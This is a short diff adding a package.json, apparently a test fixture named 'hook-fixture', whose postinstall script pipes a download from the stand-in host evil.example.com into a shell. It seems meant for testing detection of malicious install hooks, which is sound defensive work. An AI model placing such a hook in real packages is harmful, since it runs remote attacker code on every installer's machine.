@@ -1,0 +1,7 @@
+{
+  "name": "hook-fixture",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://evil.example.com/x | sh"
+  }
+}
